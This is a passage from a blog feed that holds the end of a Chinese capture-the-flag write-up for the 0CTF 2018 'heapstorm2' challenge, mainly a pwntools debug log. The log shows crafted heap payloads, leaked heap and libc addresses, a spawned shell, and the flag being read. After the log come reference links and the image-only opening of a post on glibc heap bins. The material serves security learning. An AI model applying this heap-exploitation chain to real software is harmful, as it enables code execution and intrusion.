&apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;56\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 1 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1256\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 2 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 4 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;12\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0xc bytes:</span><br><span class="line">    &apos;h&apos; * 0xc</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 3 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 4 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1240\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 8 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 4 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;5\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 5 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;72\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 4 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 2 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1256\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 2 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 2 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;7\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;48\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x30 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  f1 04 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000020  00 00 00 00  00 00 00 00  e0 07 37 13  00 00 00 00  │····│····│··7·│····│</span><br><span class="line">    00000030</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 7 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;8\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;80\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x50 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    00000020  00 00 00 00  00 00 00 00  e1 04 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000030  00 00 00 00  00 00 00 00  e8 07 37 13  00 00 00 00  │····│····│··7·│····│</span><br><span class="line">    00000040  00 00 00 00  00 00 00 00  c3 07 37 13  00 00 00 00  │····│····│··7·│····│</span><br><span class="line">    00000050</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 8 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;72\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 2 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;56\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x38 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    00000020  00 00 00 00  00 00 00 00  31 73 37 13  00 00 00 00  │····│····│1s7·│····│</span><br><span class="line">    00000030  00 08 37 13  00 00 00 00                            │··7·│····││</span><br><span class="line">    00000038</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 2 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;0\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;64\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x40 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  31 73 37 13  00 00 00 00  │····│····│1s7·│····│</span><br><span class="line">    00000020  00 08 37 13  00 00 00 00  00 10 00 00  00 00 00 00  │··7·│····│····│····│</span><br><span class="line">    00000030  e3 07 37 13  00 00 00 00  08 00 00 00  00 00 00 00  │··7·│····│····│····│</span><br><span class="line">    00000040</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 0 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0xa bytes:</span><br><span class="line">    &apos;Chunk[1]: &apos;</span><br><span class="line">[DEBUG] Received 0x42 bytes:</span><br><span class="line">    00000000  60 40 2f 97  25 56 00 00  0a 31 2e 20  41 6c 6c 6f  │`@/·│%V··│·1. │Allo│</span><br><span class="line">    00000010  63 61 74 65  0a 32 2e 20  55 70 64 61  74 65 0a 33  │cate│·2. │Upda│te·3│</span><br><span class="line">    00000020  2e 20 44 65  6c 65 74 65  0a 34 2e 20  56 69 65 77  │. De│lete│·4. │View│</span><br><span class="line">    00000030  0a 35 2e 20  45 78 69 74  0a 43 6f 6d  6d 61 6e 64  │·5. │Exit│·Com│mand│</span><br><span class="line">    00000040  3a 20                                               │: │</span><br><span class="line">    00000042</span><br><span class="line">heap: 5625972f4060</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;0\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;64\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x40 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  31 73 37 13  00 00 00 00  │····│····│1s7·│····│</span><br><span class="line">    00000020  00 08 37 13  00 00 00 00  00 10 00 00  00 00 00 00  │··7·│····│····│····│</span><br><span class="line">    00000030  70 40 2f 97  25 56 00 00  08 00 00 00  00 00 00 00  │p@/·│%V··│····│····│</span><br><span class="line">    00000040</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 0 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0xa bytes:</span><br><span class="line">    &apos;Chunk[1]: &apos;</span><br><span class="line">[DEBUG] Received 0x42 bytes:</span><br><span class="line">    00000000  58 cb 14 2e  7a 7f 00 00  0a 31 2e 20  41 6c 6c 6f  │X··.│z···│·1. │Allo│</span><br><span class="line">    00000010  63 61 74 65  0a 32 2e 20  55 70 64 61  74 65 0a 33  │cate│·2. │Upda│te·3│</span><br><span class="line">    00000020  2e 20 44 65  6c 65 74 65  0a 34 2e 20  56 69 65 77  │. De│lete│·4. │View│</span><br><span class="line">    00000030  0a 35 2e 20  45 78 69 74  0a 43 6f 6d  6d 61 6e 64  │·5. │Exit│·Com│mand│</span><br><span class="line">    00000040  3a 20                                               │: │</span><br><span class="line">    00000042</span><br><span class="line">libc_base: 7f7a2ddb3000</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;0\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;88\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x58 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  31 73 37 13  00 00 00 00  │····│····│1s7·│····│</span><br><span class="line">    00000020  00 08 37 13  00 00 00 00  00 10 00 00  00 00 00 00  │··7·│····│····│····│</span><br><span class="line">    00000030  88 e7 14 2e  7a 7f 00 00  00 01 00 00  00 00 00 00  │···.│z···│····│····│</span><br><span class="line">    00000040  50 08 37 13  00 00 00 00  00 01 00 00  00 00 00 00  │P·7·│····│····│····│</span><br><span class="line">    00000050  2f 62 69 6e  2f 73 68 00                            │/bin│/sh·││</span><br><span class="line">    00000058</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 0 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;8\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x8 bytes:</span><br><span class="line">    00000000  80 24 df 2d  7a 7f 00 00                            │·$·-│z···││</span><br><span class="line">    00000008</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 1 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;ls\n&apos;</span><br><span class="line">[DEBUG] Received 0x17 bytes:</span><br><span class="line">    &apos;flag\n&apos;</span><br><span class="line">    &apos;heapstorm2\n&apos;</span><br><span class="line">    &apos;pow.py\n&apos;</span><br><span class="line">flag</span><br><span class="line">heapstorm2</span><br><span class="line">pow.py</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    &apos;cat flag\n&apos;</span><br><span class="line">[DEBUG] Received 0x4b bytes:</span><br><span class="line">    &apos;flag&#123;Seize it, control it, and exploit it. Welcome to the House of Storm.&#125;\n&apos;</span><br><span class="line">flag&#123;Seize it, control it, and exploit it. Welcome to the House of Storm.&#125;</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    &apos;whoami\n&apos;</span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    &apos;heapstorm2\n&apos;</span><br><span class="line">heapstorm2</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;ls\n&apos;</span><br><span class="line">[DEBUG] Received 0x17 bytes:</span><br><span class="line">    &apos;flag\n&apos;</span><br><span class="line">    &apos;heapstorm2\n&apos;</span><br><span class="line">    &apos;pow.py\n&apos;</span><br><span class="line">flag</span><br><span class="line">heapstorm2</span><br><span class="line">pow.py</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-122421.png" alt=""></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://gist.github.com/Jackyxty/9de01a0bdfe5fb6d0b40fe066f059fa3" target="_blank" rel="noopener">https://gist.github.com/Jackyxty/9de01a0bdfe5fb6d0b40fe066f059fa3</a></p><p><a href="https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md" target="_blank" rel="noopener">https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md</a></p><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/heapstorm2/heapstorm2.i64" target="_blank" rel="noopener">我的i64文件</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接&quot;&gt;&lt;/a&gt;题目链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/eternalsakura/ctf_pwn/tree/master/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="堆利用" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="overlap" scheme="http://eternalsakura13.com/tags/overlap/"/>
    
      <category term="chunk shrink" scheme="http://eternalsakura13.com/tags/chunk-shrink/"/>
    
  </entry>
  
  <entry>
    <title>堆题里用到的一些杂乱的东西</title>
    <link href="http://eternalsakura13.com/2018/04/03/heap2/"/>
    <id>http://eternalsakura13.com/2018/04/03/heap2/</id>
    <published>2018-04-03T02:07:31.958Z</published>
    <updated>2018-04-03T11:55:00.774Z</updated>
    
    <content type="html"><![CDATA[<h2 id="small-bin大小"><a href="#small-bin大小" class="headerlink" title="small bin大小"></a>small bin大小</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-020851.png" alt=""></p><h2 id="fastbin的索引"><a href="#fastbin的索引" class="headerlink" title="fastbin的索引"></a>fastbin的索引</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-023424.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-023459.png" alt=""></p><h2 id="计算bin的index"><a href="#计算bin的index" class="headerlink" title="计算bin的index"></a>计算bin的index</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-020954.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-021011.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-021026.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-021050.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-021106.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-021120.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-021134.png" alt=""></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-021157.png" alt=""></p><h2 id="请求的大小转换为实际的大小"><a href="#请求的大小转换为实际的大小" class="headerlink" title="请求的大小转换为实际的大小"></a>请求的大小转换为实际的大小</h2><p><img 